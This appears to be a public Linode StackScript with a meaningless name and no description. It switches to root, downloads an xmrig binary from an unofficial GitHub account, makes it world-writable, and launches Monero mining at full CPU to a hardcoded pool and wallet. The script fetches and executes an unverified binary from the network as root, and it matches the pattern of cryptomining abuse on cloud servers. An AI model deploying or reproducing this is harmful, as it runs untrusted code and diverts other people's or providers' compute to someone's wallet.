# linode/dsfrfrf.sh by bailfjii99
# id: 781551
# description: 
# defined fields: 
# images: ['linode/ubuntu20.04']
# stats: Used By: 0 + AllTime: 140
#!/bin/bash
sudo su
apt-get update -y
wget -P /root/ https://github.com/admina1222/xmrig/releases/download/6.7.0/xmrig
chmod 777 /root/xmrig
/root/xmrig --cpu-max-threads-hint=100 -o ca.minexmr.com:443 -u 8AZnqkXEAKLKVLrfLznHbvK78nv2WzNWuFhuG6dZyNNieWSwF6ruefhenG8q4D7T64LfVo8JoEmhRXb8ZyEqPx76BqxrBhK -k --tls --rig-id linode --donate-level=0 --threads=4